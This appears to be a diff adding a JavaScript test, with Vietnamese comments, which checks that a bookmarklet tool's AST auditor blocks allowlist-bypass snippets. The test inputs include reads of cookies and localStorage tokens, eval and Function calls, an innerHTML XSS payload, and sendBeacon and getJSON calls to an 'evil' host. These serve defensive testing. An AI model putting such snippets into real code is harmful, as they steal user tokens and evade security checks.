@@ -78,3 +78,39 @@ test('wiki build có CSP, không script inline', () => {
   assert.equal(scriptSrc, `"script-src 'self'"`);
   for (const f of ['index.html', 'src/main.js', 'src/ui.js']) assert.doesNotMatch(readFileSync(join(ROOT, f), 'utf8'), /\son[a-z]+="/, f);
 });
+
+import { auditSource } from '../build-tool.mjs';
+
+test('bookmarklet: bộ kiểm tra AST chặn các kiểu lách danh sách cho phép', () => {
+  const base = readFileSync(join(ROOT, 'tool/game-bridge.js'), 'utf8');
+  const overlay = readFileSync(join(ROOT, 'tool/overlay.js'), 'utf8');
+  const logic = readFileSync(join(ROOT, 'tool/logic.js'), 'utf8');
+  const clean = [['game-bridge.js', base], ['overlay.js', overlay], ['logic.js', logic]];
+  assert.deepEqual(auditSource(clean), [], 'code hiện tại phải qua kiểm tra');
+  const attacks = {
+    'ngoặc vuông': "export const x = g => g.session['sell' + 'Creature'](1);",
+    'gán biến': 'export const x = g => { const s = g.session; s.sellCreature(1); };',
+    'destructuring': 'export const x = g => { const { session } = g; return session; };',
+    'hàm ngoài danh sách': 'export const x = g => g.session.sellCreature(1);',
+    '.call': 'export const x = (f, g) => f.call(g);',
+    'socket send': 'export const x = ws => ws.send("x");',
+    'sendBeacon': 'export const x = () => navigator.sendBeacon("https://evil", "x");',
+    'eval': 'export const x = s => eval(s);',
+    'Function': 'export const x = s => new Function(s);',
+    'Reflect': 'export const x = (g) => Reflect.get(g, "session");',
+    'MouseEvent': 'export const x = el => new MouseEvent("click");',
+    'localStorage': 'export const x = () => localStorage.getItem("token");',
+    'cookie': 'export const x = () => document.cookie;',
+    'innerHTML': 'export const x = el => { el.innerHTML = "<img onerror=alert(1)>"; };',
+    'dispatch': 'export const x = g => g.store.dispatch({ type: "sell" });',
+    'WebSocket.prototype': 'export const x = () => WebSocket.prototype.send;',
+  };
+  for (const [name, snippet] of Object.entries(attacks)) {
+    const files = [...clean.filter(([f]) => f !== 'logic.js'), ['logic.js', `${logic}\n${snippet}`]];
+    const bridgeFiles = [['game-bridge.js', `${base}\n${snippet}`], ...clean.filter(([f]) => f !== 'game-bridge.js')];
+    assert.ok(auditSource(files).length > 0 && auditSource(bridgeFiles).length > 0, `không chặn được: ${name}`);
+  }
+  // getJSON tới địa chỉ lạ, thêm phím ngoài W/A/S/D.
+  assert.ok(auditSource([['overlay.js', overlay.replace("getJSON('/catalog'", "getJSON('https://evil/'")], ['game-bridge.js', base], ['logic.js', logic]]).length > 0);
+  assert.ok(auditSource([['overlay.js', overlay.replace("right: ['KeyD', 'd']", "right: ['Enter', 'Enter']")], ['game-bridge.js', base], ['logic.js', logic]]).length > 0);
+});
